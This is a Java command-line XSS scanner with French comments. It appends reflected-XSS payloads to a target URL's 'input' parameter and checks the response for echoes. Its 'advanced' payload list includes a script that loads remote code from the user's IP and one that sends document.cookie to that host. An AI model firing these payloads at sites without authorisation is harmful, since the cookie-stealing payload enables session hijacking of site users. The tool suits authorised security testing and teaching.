import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class XSSScanner {
    // Liste de payloads XSS courants
    private static final String[] EASY_XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",                                                    // Payload XSS basique
        "<plaintext>",
        "<script>console.log('XSS')</script>",
        "<img src=\"\" onerror=alert('XSS')>",                                              // Payload XSS basé sur HTML
        "<script>document.body.style.background = '#141d2b'</script>",                      // Changer la couleur de fond
        "<script>document.title = 'XSS Test'</script>",                                     // Changer le titre du site web
        "<script>document.getElementsByTagName('body')[0].innerHTML = 'XSS'</script>",      // Remplacer le contenu principal du site
        "<script>document.getElementById('test').remove();</script>"                        // Supprimer un élément HTML spécifique
    };

    private static final String[] ADVANCED_XSS_PAYLOADS_TEMPLATE = {
        "<script src=\"http://%s/script.js\"></script>",                                    // Charger un script distant
        "<script>new Image().src='http://%s/index.php?c='+document.cookie</script>"         // Envoyer les détails du cookie
    };

    /**
     * Demande à l'utilisateur d'entrer une URL dans le terminal et lance l'analyse XSS sur cette URL.
     */
    public void askForUrlAndScan() {
        try (Scanner scanner = new Scanner(System.in)) {
            System.out.print("Entrez l'URL à scanner : ");
            String url = scanner.nextLine();
            System.out.print("Voulez-vous effectuer une analyse avancée ? (oui/non) : ");
            String advancedScan = scanner.nextLine().trim().toLowerCase();
            if (advancedScan.equals("oui")) {
                System.out.print("Entrez votre adresse IP : ");
                String userIp = scanner.nextLine();
                scanForXSSadvanced(url, userIp);
            } else {
                scanForXSSeasy(url);
            }
        }
    }

    /**
     * Analyse une URL donnée pour détecter des vulnérabilités XSS en utilisant une liste de payloads courants.
     * 
     * @param url L'URL à analyser.
     */
    public void scanForXSSeasy(String url) {
        System.out.println("Test des payloads simples...");
        for (String payload : EASY_XSS_PAYLOADS) {
            String testUrl = url + "?input=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
            System.out.println("Test : " + testUrl);
            String response = sendRequest(testUrl);
            if (response != null && response.contains(payload)) {
                System.out.println("[!] XSS détecté avec le payload : " + payload);
            } else {
                System.out.println("[-] Aucun XSS détecté avec le payload : " + payload);
            }
        }
    }

    /**
     * Analyse une URL donnée pour détecter des vulnérabilités XSS en utilisant une liste de payloads avancés.
     * 
     * @param url L'URL à analyser.
     * @param userIp L'adresse IP de l'utilisateur pour les payloads avancés.
     */
    public void scanForXSSadvanced(String url, String userIp) {
        System.out.println("Test des payloads avancés...");
        for (String payloadTemplate : ADVANCED_XSS_PAYLOADS_TEMPLATE) {
            String payload = String.format(payloadTemplate, userIp);
            String testUrl = url + "?input=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
            System.out.println("Test : " + testUrl);
            String response = sendRequest(testUrl);
            if (response != null && response.contains(payload)) {
                System.out.println("[!] XSS détecté avec le payload : " + payload);
            } else {
                System.out.println("[-] Aucun XSS détecté avec le payload : " + payload);
            }
        }
    }

    /**
     * Envoie une requête HTTP GET à une URL cible et retourne la réponse sous forme de chaîne de caractères.
     * 
     * @param targetUrl L'URL cible à laquelle envoyer la requête.
     * @return La réponse de la requête sous forme de chaîne de caractères, ou null en cas d'erreur.
     */
    private String sendRequest(String targetUrl) {
        try {
            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "XSSScanner/1.0");
            
            StringBuilder response;
            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null) {
                    response.append(line);
                }
            }
            return response.toString();
        } catch (Exception e) {
            System.out.println("Erreur lors du scan : " + e.getMessage());
            return null;
        }
    }
    
    public static void main(String[] args) {
        (new XSSScanner()).askForUrlAndScan();
    }
}
